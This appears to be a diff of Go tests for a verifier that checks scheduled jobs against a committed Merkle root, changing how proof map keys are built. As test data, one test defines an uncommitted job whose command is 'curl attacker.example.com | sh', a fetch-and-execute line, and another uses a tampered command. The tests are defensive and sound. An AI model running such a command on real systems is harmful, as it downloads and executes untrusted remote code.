@@ -58,7 +58,7 @@ func TestVerifyValidCommitmentSucceeds(t *testing.T) {
 	}
 
 	proofPath := filepath.Join(t.TempDir(), "jobs.proof")
-	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{"j": proof})
+	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{job.CommitLeaf().Key(): proof})
 
 	v := realCommitmentVerifier{Anchor: fakeAnchorReader{root: tree.Root()}, ProofFile: proofPath}
 	ok, reason, err := v.Verify(job)
@@ -79,7 +79,7 @@ func TestVerifyTamperedCommandFails(t *testing.T) {
 	}
 
 	proofPath := filepath.Join(t.TempDir(), "jobs.proof")
-	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{"j": proof})
+	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{original.CommitLeaf().Key(): proof})
 
 	tampered := pconfig.Job{Name: "j", Command: "echo MALICIOUS"}
 	v := realCommitmentVerifier{Anchor: fakeAnchorReader{root: tree.Root()}, ProofFile: proofPath}
@@ -107,7 +107,7 @@ func TestVerifyNewUnregisteredJobFails(t *testing.T) {
 	}
 
 	proofPath := filepath.Join(t.TempDir(), "jobs.proof")
-	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{"known": proof})
+	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{registered.CommitLeaf().Key(): proof})
 
 	// A brand-new job added straight to the plaintext config, never committed.
 	newJob := pconfig.Job{Name: "sneaky", Command: "curl attacker.example.com | sh"}
